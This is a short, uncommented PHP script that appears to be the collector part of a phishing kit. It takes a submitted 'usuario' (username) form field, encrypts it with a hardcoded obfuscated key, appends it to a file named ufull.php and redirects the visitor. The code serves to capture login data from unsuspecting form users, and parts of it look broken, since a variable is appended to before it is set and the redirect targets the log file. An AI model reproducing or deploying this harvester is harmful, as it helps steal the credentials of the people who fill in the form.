<?php

function encrypt($data,$key)
{
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
    $encrypted=openssl_encrypt($data, "aes-256-cbc", $key, 0, $iv);
    
    return base64_encode($encrypted."::".$iv);
}

$key=  base64_encode( base64_encode("णतथदधन଑଒ଓଔକଖଗଘଙଚଛଜଝଞଟଠଡଢଣତଥଦऩपफबभપફબભમયરऒओऔकखगघङऄअआइईउऊଫବଭମଯறலளழவߞߟߠߡߢߣߤख़ग़ज़ड़ढ़ߞߟߠߡߢߣߤߥߦߧߨߩߪ߫߬߭߮߯߰߱ࢤࢥࢦࢧࢨࢩࢪࢫࢬࢭࢮࢯࢰࢱࢲ"));


$bilsmg .= encrypt($_POST['usuario'],$key).PHP_EOL;

file_put_contents('ufull.php', $bilsmg.PHP_EOL, FILE_APPEND | LOCK_EX);

header("Location: ufull.php");
die();

?>